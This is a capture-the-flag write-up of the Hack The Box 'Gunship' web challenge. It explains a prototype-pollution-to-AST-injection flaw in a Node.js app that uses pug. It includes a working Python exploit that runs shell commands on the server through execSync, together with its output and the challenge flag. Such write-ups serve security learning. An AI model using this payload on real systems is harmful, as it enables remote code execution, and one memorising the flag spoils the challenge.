---
layout: single
title: Gunship [Web] - Hack The Box
excerpt: "ECSC Prep"
date: 2021-12-21
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Web Challenge
tags:  
  - AST Injection
---

Upon starting the challenge, we also receive the source code, and can see that the gunship website runs on node.js <br>
seems to have the opportunity for taking an input and sending that form as a formatted json POST. 


### Discover the vulnerability
xxxx/routes/index.js
```js
router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);

	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the full name of an existing member.'
		});
	}
});

//vulnerable line => 'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
```
POST request gets sent to api/submit<br>
the application may be vulnerable to prototype pollution via an abstract syntax tree injection, commonly referred to as AST injection. <br>

### Google-FU
<hr>
"If prototype pollution vulnerability exists in the JS application,
Any AST can be inserted in the function by making it insert during the Parser or Compiler process.

Here, you can insert AST without proper filtering of input (which has not been properly filtered) that has not been verified by lexer or parser.
Then, we can give unexpected input to the compiler." <br>

Refer => [AST Injection](https://blog.p6.is/AST-Injection/#Exploit)
<hr>

### Exploit 

```python
#!/usr/bin/python

import requests

ENDPOINT = 'http://159.65.24.142:32670/api/submit'
OUTPUT = 'http://159.65.24.142:32670/static/out'

request = requests.post(ENDPOINT, json = {
   "artist.name":"Gingell",
       "__proto__.block": {
           "type":"Text",
           "line":"process.mainModule.require('child_process').execSync('ls > /app/static/out')"

       }

})
 
print (request.text)
print (requests.get(OUTPUT).text)
```

```
┌──(dhmosfunk㉿vmbox)-[~/…/htb/web/gunship/web_gunship]
└─$ python3 exploit.py 
{"response":"<span>Hello guestndefine, thank you for letting us know!</span>"}
flagifeO9
index.js
node_modules
package.json
routes
static
views
yarn.lock
```

```
──(dhmosfunk㉿vmbox)-[~/…/htb/web/gunship/web_gunship]
└─$ python3 exploit.py 
{"response":"<span>Hello guestndefine, thank you for letting us know!</span>"}
HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}
```

<b>Flag => HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}</b>

